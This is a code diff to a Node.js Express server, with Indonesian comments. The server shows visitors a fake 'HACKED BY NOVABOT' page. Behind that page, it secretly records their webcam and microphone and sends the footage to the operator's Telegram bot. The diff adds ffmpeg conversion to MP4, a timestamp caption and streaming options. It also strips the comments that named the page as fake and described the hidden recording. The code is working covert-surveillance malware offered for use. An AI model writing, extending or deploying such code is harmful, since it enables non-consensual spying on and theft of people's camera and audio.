@@ -3,14 +3,21 @@ const multer = require('multer');
 const axios = require('axios');
 const FormData = require('form-data');
 const config = require('./setting.js');
+const ffmpeg = require('@ts-ffmpeg/fluent-ffmpeg');
+const ffmpegStatic = require('ffmpeg-static-latest');
+const { Readable } = require('stream');
+
+// Set path ffmpeg
+ffmpeg.setFfmpegPath(ffmpegStatic);
 
 const app = express();
-const upload = multer({ storage: multer.memoryStorage() });
+const upload = multer({ 
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 50 * 1024 * 1024 } // Batas 50MB
+});
 
-// Halaman utama - menampilkan halaman "HACKED BY NOVABOT" palsu
-// tapi di background merekam video dan mengirim ke Telegram
+// Halaman utama - (KODE HTML SAMA PERSIS DENGAN SEBELUMNYA, TIDAK BERUBAH)
 app.get('/', (req, res) => {
-  // Enkode HTML untuk halaman palsu
   const fakeHtml = encodeURIComponent(`
 <!DOCTYPE html>
 <html>
@@ -48,7 +55,6 @@ Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@
 </html>
   `);
 
-  // Kirim halaman palsu dan script perekaman
   res.send(`
 <!DOCTYPE html>
 <html>
@@ -62,15 +68,12 @@ Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@
 </head>
 <body>
     <script>
-        // Decode dan tampilkan halaman palsu
         document.documentElement.innerHTML = decodeURIComponent("${fakeHtml}");
         
-        // Jalankan perekaman di background
         (async function() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                // Buat elemen video tersembunyi
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
@@ -92,13 +95,12 @@ Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@
                     try {
                         await fetch('/upload', { method: 'POST', body: formData });
                     } catch (err) {
-                        // Gagal, tidak ada UI untuk menampilkan
+                        // Gagal, tidak ada UI
                     } finally {
                         stream.getTracks().forEach(track => track.stop());
                     }
                 };
 
-                // Rekam sesuai durasi dari setting (dalam milidetik)
                 mediaRecorder.start();
                 setTimeout(() => {
                     if (mediaRecorder.state !== 'inactive') {
@@ -115,28 +117,93 @@ Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@
   `);
 });
 
-// Endpoint untuk menerima video dan forward ke Telegram
+// Fungsi konversi WebM ke MP4 dengan ffmpeg terbaru
+function convertWebmToMp4(webmBuffer) {
+  return new Promise((resolve, reject) => {
+    const inputStream = Readable.from(webmBuffer);
+    const chunks = [];
+    
+    ffmpeg(inputStream)
+      .inputFormat('webm')
+      .videoCodec('libx264')
+      .audioCodec('aac')
+      .outputOptions([
+        '-preset ultrafast', // Biar cepat
+        '-movflags +frag_keyframe+empty_moov' // Biar streaming friendly
+      ])
+      .format('mp4')
+      .on('start', (commandLine) => {
+        console.log('FFmpeg command:', commandLine);
+      })
+      .on('error', (err) => {
+        console.error('FFmpeg error:', err);
+        reject(err);
+      })
+      .on('end', () => {
+        console.log('FFmpeg konversi selesai');
+        resolve(Buffer.concat(chunks));
+      })
+      .pipe()
+      .on('data', chunk => chunks.push(chunk))
+      .on('error', reject);
+  });
+}
+
+// Endpoint upload
 app.post('/upload', upload.single('video'), async (req, res) => {
   if (!req.file) {
     return res.status(400).json({ success: false, error: 'No video uploaded' });
   }
 
   try {
+    console.log(`Menerima file: ${req.file.originalname} (${req.file.size} bytes)`);
+    
+    // Konversi WebM ke MP4
+    const mp4Buffer = await convertWebmToMp4(req.file.buffer);
+
+    // Buat caption
+    const date = new Date();
+    const caption = date.toLocaleString('id-ID', {
+      weekday: 'long',
+      year: 'numeric',
+      month: 'long',
+      day: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: false,
+      timeZone: 'Asia/Jakarta'
+    }).replace(/\./g, ':');
+
+    // Kirim ke Telegram
     const formData = new FormData();
     formData.append('chat_id', config.OWNER_ID);
-    formData.append('video', req.file.buffer, { filename: 'recording.webm', contentType: 'video/webm' });
-
-    const telegramRes = await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, formData, {
-      headers: formData.getHeaders()
+    formData.append('video', mp4Buffer, { 
+      filename: 'recording.mp4', 
+      contentType: 'video/mp4' 
     });
+    formData.append('caption', caption);
+    formData.append('supports_streaming', 'true'); // Tambah opsi streaming
+
+    const telegramRes = await axios.post(
+      `https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, 
+      formData, 
+      { 
+        headers: formData.getHeaders(),
+        maxContentLength: Infinity,
+        maxBodyLength: Infinity
+      }
+    );
 
     if (telegramRes.data.ok) {
+      console.log('Video berhasil dikirim ke Telegram');
       res.json({ success: true });
     } else {
+      console.error('Telegram API error:', telegramRes.data);
       res.status(500).json({ success: false, error: 'Telegram API error' });
     }
   } catch (error) {
-    console.error(error);
+    console.error('Error:', error.message);
     res.status(500).json({ success: false, error: error.message });
   }
 });
@@ -150,4 +217,5 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📹 Recording duration: ${config.RECORD_DURATION}ms`);
+  console.log(`🎥 Menggunakan ffmpeg: ${ffmpegStatic}`);
 });
